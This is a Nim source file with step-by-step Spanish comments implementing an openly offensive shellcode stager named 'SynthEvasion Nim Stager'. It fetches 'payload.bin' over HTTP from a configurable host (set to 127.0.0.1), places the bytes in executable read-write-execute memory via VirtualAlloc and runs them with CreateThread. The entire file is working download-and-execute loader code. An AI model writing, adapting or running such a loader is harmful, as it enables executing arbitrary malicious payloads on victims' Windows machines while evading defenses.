# Importamos la librería 'winim' para acceder a la API de Windows de forma directa.
# El 'lean' es para una versión más ligera que solo incluye las definiciones.
import winim

# --- Pragmas del compilador ---
# Esto es como le decimos a Nim que pase argumentos al enlazador (linker).
# Es el equivalente a #pragma comment(lib, "wininet.lib") en C++.
{.passL: "-lwininet".}

proc main() =
  ## --- PASO 1: CONEXIÓN Y DESCARGA DEL PAYLOAD ---
  let
    host = "127.0.0.1"
    path = "/payload.bin"
    url = "http://" & host & path

  echo "[+] Intentando conectar a ", url

  # InternetOpenA toma cadenas de C (cstring), por eso la conversión con '$'.
  let hInternet = InternetOpenA("SynthEvasion Nim Stager".cstring, INTERNET_OPEN_TYPE_DIRECT, nil, nil, 0)
  if hInternet == nil:
    echo "[-] Error en InternetOpenA: ", GetLastError()
    return

  let hConnect = InternetOpenUrlA(hInternet, url.cstring, nil, 0, INTERNET_FLAG_RELOAD, 0)
  if hConnect == nil:
    echo "[-] Error en InternetOpenUrlA: ", GetLastError()
    InternetCloseHandle(hInternet)
    return

  echo "[+] Conexión establecida. Descargando payload..."

  # 'seq[byte]' es una secuencia dinámica de bytes, perfecta para nuestro payload.
  var payload: seq[byte] = @[]
  var
    buffer: array[4096, byte] # Un buffer temporal para la lectura.
    bytesRead: DWORD = 0

  # Leemos los datos en un bucle y los añadimos a nuestra secuencia 'payload'.
  while InternetReadFile(hConnect, buffer.addr, buffer.len.DWORD, &bytesRead) and bytesRead > 0:
    payload.add(buffer[0 ..< bytesRead]) # Añadimos solo los bytes leídos.

  echo "[+] Payload descargado. Total de bytes: ", payload.len

  ## --- PASO 2: ALOJAMIENTO DEL PAYLOAD EN MEMORIA ---
  # La llamada a VirtualAlloc es idéntica a la de C++.
  let execMem = VirtualAlloc(nil, payload.len, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
  if execMem == nil:
    echo "[-] Error en VirtualAlloc: ", GetLastError()
    # Aquí iría la limpieza de los handles de internet.
    return

  # Usamos 'cast' para convertir el puntero a un entero y poder imprimirlo en hexadecimal.
  echo "[+] Memoria ejecutable asignada en la dirección: 0x", cast[uint](execMem).toHex()

  # 'copyMem' es el equivalente de Nim a 'memcpy'.
  # '.addr' obtiene la dirección de memoria del primer elemento de nuestra secuencia.
  copyMem(execMem, payload[0].addr, payload.len)
  echo "[+] Payload copiado a la memoria ejecutable."

  ## --- PASO 3: EJECUCIÓN DEL PAYLOAD ---
  echo "[+] Creando un nuevo hilo para ejecutar el payload..."

  # La llamada a CreateThread también es idéntica.
  # Usamos 'cast' para decirle al compilador que nuestro puntero 'execMem'
  # es una rutina de inicio de hilo válida.
  let hThread = CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](execMem), nil, 0, nil)
  if hThread == nil:
    echo "[-] Error en CreateThread: ", GetLastError()
    # Aquí iría la limpieza de memoria y handles.
    return

  # Esperamos a que el hilo termine.
  WaitForSingleObject(hThread, INFINITE)
  echo "[+] El hilo del payload ha finalizado."

  ## --- PASO 4: LIMPIEZA ---
  CloseHandle(hThread)
  InternetCloseHandle(hConnect)
  InternetCloseHandle(hInternet)
  VirtualFree(execMem, 0, MEM_RELEASE)

  echo "[+] Recursos liberados. Operación completada."

# Ejecutamos nuestra función principal.
main()